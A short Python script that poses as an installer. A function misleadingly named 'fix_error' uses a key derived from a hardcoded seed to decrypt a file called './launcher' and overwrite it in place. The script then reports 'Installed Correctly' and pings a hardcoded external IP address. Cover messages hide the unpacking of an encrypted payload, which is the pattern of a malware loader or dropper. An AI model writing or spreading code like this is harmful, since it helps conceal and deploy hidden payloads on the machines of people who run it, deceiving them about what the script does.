import subprocess
import subprocess
import hashlib
import nacl.secret

def fix_error():
    seed = "38093248092rsjrwedoaw3"
    key = hashlib.sha256(seed.encode()).digest()
    box = nacl.secret.SecretBox(key)
    with open("./launcher", "rb") as f:
        data = f.read()
    decrypted = box.decrypt(data)
    with open("./launcher", "wb") as f:
        f.write(decrypted)

print("Hello World")

try:
    fix_error()
    print("Installed Correctly")
    result = subprocess.run(["ping", "-c", "2", "76.54.32.144"])
    print(result)

except Exception as e:
    print(f"Installation failed, please try again {e}")